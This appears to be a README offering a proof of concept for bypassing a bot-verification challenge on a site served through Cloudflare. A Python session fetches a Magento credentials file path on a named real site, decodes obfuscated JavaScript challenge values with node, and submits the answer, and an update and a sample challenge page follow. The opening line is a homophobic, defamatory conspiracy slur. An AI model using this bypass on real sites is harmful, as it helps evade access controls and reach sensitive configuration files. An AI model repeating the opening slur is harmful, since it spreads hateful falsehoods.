# HowTo-ByPass-Clouflare

Cloudflare is Satanic Gay Pedophile Organisation led by Biden

POC:

```python
~ 
❯ python
Python 3.10.5 (main, Jun  6 2022, 18:49:26) [GCC 12.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> u = "https://mhosting.co.uk/app/etc/local.xml"
>>> r = requests.get(u)
>>> r.headers
{'Date': 'Mon, 11 Jul 2022 17:59:17 GMT', 'Content-Type': 'text/xml', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'last-modified': 'Monday, 11-Jul-2022 17:59:17 GMT', 'Cache-Control': 'private, no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0', 'cf-edge-cache': 'no-cache', 'CF-Cache-Status': 'DYNAMIC', 'Expect-CT': 'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"', 'Report-To': '{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=P%2F2uQ%2BR%2FwuZRAbaKORQF79%2BmBRHpI1koOVAkx%2BOqPIR1vr2ZELdUKUSTAtPiTjc6uRKGA%2BpbIzw4Xvxb7wMyG8ovtmmvss4wyci1aOOnM4U78DDkEkAeyv%2BsL8C7JdMDwQ%3D%3D"}],"group":"cf-nel","max_age":604800}', 'NEL': '{"success_fraction":0,"report_to":"cf-nel","max_age":604800}', 'Server': 'cloudflare', 'CF-RAY': '72936e9efed9929c-FRA', 'Content-Encoding': 'gzip', 'alt-svc': 'h3=":443"; ma=86400, h3-29=":443"; ma=86400'}
>>> import re
>>> import subprocess
>>> matches = re.findall(r'(east|west)=([^,]+)', r.text)
>>> data = dict(matches)
>>> data['east']
'+((+!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]))'
>>> subprocess.check_output(['node', '-e', 'console.log(' + data['east']  + ')'], text=True)
'7082897\n'
>>> results = {}
>>> for k, v in data.items():
...     output=subprocess.check_output(['node', '-e', f'console.log({v})'], text=True)
...     results[k]=int(output)
... 
>>> results
{'west': 8010498, 'east': 7082897}
>>> r.text
'<!doctype html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta name="robots" content="noindex, nofollow">\n<title>One moment, please...</title>\n<style>\nbody {\n    background: #F6F7F8;\n    color: #303131;\n    font-family: sans-serif;\n    margin-top: 45vh;\n    text-align: center;\n}\n</style>\n</head>\n<body>\n<h1>Please wait while your request is being verified...</h1>\n<form id="wsidchk-form" style="display:none;" action="/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f" method="get">\n<input type="hidden" id="wsidchk" name="wsidchk"/>\n</form>\n<script>\n(function(){\n    var west=+((+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+![]+[])+(+!+[])+(+![]+[])+(+!+[]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])),\n        east=+((+!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![])),\n        x=function(){try{return !!window.addEventListener;}catch(e){return !!0;} },\n        y=function(y,z){x() ? document.addEventListener("DOMContentLoaded",y,z) : document.attachEvent("onreadystatechange",y);};\n    y(function(){\n        document.getElementById(\'wsidchk\').value = west + east;\n        document.getElementById(\'wsidchk-form\').submit();\n    }, false);\n})();\n</script>\n</body>\n</html>'
>>> match = re.search(r'<form id="wsidchk-form" style="display:none;" action="([^"]+)', r.text)
>>> match.group(1)
'/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f'
>>> import urllib.parse
>>> target = urllib.parse.urljoin(r.url, match.group(1))
>>> target
'https://mhosting.co.uk/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f'
>>> query = {'wsidchk': results['east'] + results['west']}
>>> r=requests.get(target, query)
>>> r.text
'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n'
>>>
```

UPD:

```python
>>> west, east = re.findall(r'(?:west|east)=([^,]+)', r.text)
>>> subprocess.check_output(['node', '-e', f'console.log({west} + {east})'], text=True)
'15093395\n'
>>>
```

Test Example:

```html
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex, nofollow">
<title>One moment, please...</title>
<style>
body {
    background: #F6F7F8;
    color: #303131;
    font-family: sans-serif;
    margin-top: 45vh;
    text-align: center;
}
</style>
</head>
<body>
<h1>Please wait while your request is being verified...</h1>
<form id="wsidchk-form" style="display:none;" action="/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f" method="get">
<input type="hidden" id="wsidchk" name="wsidchk"/>
</form>
<script>
(function(){
    var west=+((+!+[])+(+!+[]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+[])+(+![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])),
        east=+((+!+[])+(+!+[]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+![]+[])+(+!+[]+!![])+(+!+[]+!![]+!![]+!![]+!![]+[])),
        x=function(){try{return !!window.addEventListener;}catch(e){return !!0;} },
        y=function(y,z){x() ? document.addEventListener("DOMContentLoaded",y,z) : document.attachEvent("onreadystatechange",y);};
    y(function(){
        document.getElementById('wsidchk').value = west + east;
        document.getElementById('wsidchk-form').submit();
    }, false);
})();
</script>
</body>
</html>
```
